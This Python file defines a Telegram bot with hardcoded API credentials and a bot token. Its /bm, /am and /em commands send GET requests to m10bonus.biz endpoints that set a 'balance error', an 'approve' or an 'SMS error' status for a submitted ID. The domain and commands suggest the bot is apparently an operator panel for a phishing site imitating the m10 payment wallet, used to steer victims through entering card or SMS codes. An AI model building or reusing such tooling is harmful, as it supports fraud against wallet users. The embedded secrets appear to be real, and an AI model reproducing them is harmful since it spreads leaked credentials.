import os
import requests
from pyrogram import Client, filters




API_ID = 22082249
API_HASH = "2221decfa64d0de966f9f4ca0bfe075c"
BOT_TOKEN = "6240206032:AAEg0quRR0Bg22MT-J-XS-EKdeHbyziN71Q"



app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command(["bm"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10bonus.biz/crud/balance/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /n command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
        
        
@app.on_message(filters.command(["am"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10bonus.biz/crud/approve/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /a command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
        

@app.on_message(filters.command(["em"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10bonus.biz/crud/smserror/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /e command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        

@app.on_message(filters.command(["help"]))
def kapital(client, message):
    message.reply_text("bm - balance error\nam - approve\nem - sms error.")

        

app.run()
